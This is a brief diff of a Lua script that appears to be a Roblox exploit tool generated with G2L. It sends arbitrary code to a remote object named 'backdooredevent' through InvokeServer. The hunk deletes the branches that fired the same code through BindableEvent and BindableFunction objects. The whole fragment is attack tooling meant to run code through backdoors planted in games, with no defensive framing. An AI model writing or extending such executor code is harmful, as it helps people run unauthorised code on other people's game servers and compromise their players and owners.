@@ -3599,12 +3599,6 @@ local script = G2L["4"];
 		if backdooredevent:IsA("RemoteFunction") then
 			backdooredevent:InvokeServer(code)
 		end
-		if backdooredevent:IsA("BindableEvent") then
-			backdooredevent:Fire(code)
-		end
-		if backdooredevent:IsA("BindableFunction") then
-			backdooredevent:Invoke(code)
-		end
 	end)
 end;
 task.spawn(C_4);
